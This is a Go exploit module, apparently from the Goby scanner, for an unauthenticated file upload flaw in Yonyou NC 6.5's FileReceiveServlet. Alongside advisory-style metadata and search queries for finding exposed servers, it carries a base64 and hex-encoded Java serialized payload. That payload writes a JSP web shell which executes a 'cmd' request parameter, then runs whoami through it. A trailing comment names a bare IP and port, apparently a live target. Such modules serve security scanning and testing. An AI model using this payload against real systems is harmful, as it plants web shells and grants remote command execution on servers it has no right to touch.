package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC 6.5 FileReceiveServlet File Upload",
    "Description": "<p>Yonyou NC is an enterprise-level management software that is widely used in large and medium-sized enterprises. An IT solution information platform that realizes the integration of modeling, development, inheritance, operation and management.</p><p>Yonyou NC6.5 FileReceiveServlet has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload arbitrary files on the target system and execute command and control server privileges.</p>",
    "Product": "yongyou -RP-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2020-12-07",
    "Author": "1291904552@qq.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "2",
    "Impact": "<p>Yonyou NC6.5 FileReceiveServlet has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload arbitrary files on the target system and execute command and control server privileges.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com\">https://www.yonyou.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "用友 NC 6.5版本 FileReceiveServlet 路由任意文件上传漏洞",
            "Product": "用友-ERP-NC",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ],
            "Description": "<p>用友NC是一款企业级管理软件，在大中型企业广泛使用。实现建模、开发、继承、运行、管理一体化的IT解决方案信息化平台。</p><p>用友NC6.5 FileReceiveServlet 存在任意文件上传漏洞。未经身份验证的攻击者可利用此漏洞在目标系统上传任意文件，执行命令控制服务器。</p>",
            "Impact": "<p>用友NC6.5 FileReceiveServlet 存在任意文件上传漏洞。未经身份验证的攻击者可利用此漏洞在目标系统上传任意文件，执行命令控制服务器。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com\">https://www.yonyou.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "Yonyou NC 6.5 FileReceiveServlet File Upload",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ],
            "Description": "<p>Yonyou NC is an enterprise-level management software that is widely used in large and medium-sized enterprises. An IT solution information platform that realizes the integration of modeling, development, inheritance, operation and management.</p><p>Yonyou NC6.5 FileReceiveServlet has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload arbitrary files on the target system and execute command and control server privileges.</p>",
            "Impact": "<p>Yonyou NC6.5 FileReceiveServlet has an arbitrary file upload vulnerability. An unauthenticated attacker can exploit this vulnerability to upload arbitrary files on the target system and execute command and control server privileges.</p>",
            "Product": "yongyou -RP-NC",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com\">https://www.yonyou.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "References": [
        "https://mp.weixin.qq.com/s/_dpnfY7EVR3lRIfZMoytWg"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": null,
    "ScanSteps": null,
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [],
    "CNVD": [],
    "PocId": "10831"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			payload,_ :=  base64.StdEncoding.DecodeString("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAkOTFmOWVkYWZhNjIyNzY4ZGViNTA2Mjg0NGQ5N2ZmNmMuanNwdAAQVEFSR0VUX0ZJTEVfUEFUSHQAEC4vd2ViYXBwcy9uY193ZWJ4PCUNCm91dC5wcmludGxuKG5ldyBTdHJpbmcobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIoIlpURTJOVFF5TVRFeE1HSmhNRE13T1RsaE1XTXdNemt6TXpjell6VmlORE09IikpKTsNCm5ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7DQolPg==")

			uri1 := "/servlet/FileReceiveServlet"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Data = string(payload)
			httpclient.DoHttpRequest(u, cfg1)

			uri2 := "/91f9edafa622768deb5062844d97ff6c.jsp"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil  {
				return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody,"e165421110ba03099a1c0393373c5b43")
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.RandomHexString(8)
			filenameLen := len(filename + ".jsp")
			payloadHex := "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000274000946494c455f4e414d4574"
			//payloadHex += "0008"     // 文件名长度.jsp 总共长度
			payloadHex += fmt.Sprintf("%04x", filenameLen)
			//payloadHex += "74657374" // 文件名
			payloadHex += hex.EncodeToString([]byte(filename))
			payloadHex += "2e6a73707400105441524745545f46494c455f5041544874000e776562617070732f6e635f776562783c250d0a202020206a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b0d0a20202020696e742061203d202d313b0d0a20202020627974655b5d2062203d206e657720627974655b323034385d3b0d0a202020207768696c652828613d696e2e7265616428622929213d2d31297b0d0a20202020202020206f75742e7072696e746c6e286e657720537472696e67286229293b0d0a202020207d0d0a253e"
			payload, err := hex.DecodeString(payloadHex)
			if err != nil {
				return expResult
			}

			cfg := httpclient.NewPostRequestConfig("/servlet/FileReceiveServlet")
			cfg.VerifyTls = false
			cfg.Data = string(payload)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)

			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/" + filename + ".jsp?cmd=whoami"); err == nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/" + filename + ".jsp?cmd=whoami"
			}
			return expResult
		},
	))
}
//http://52.83.198.173:5555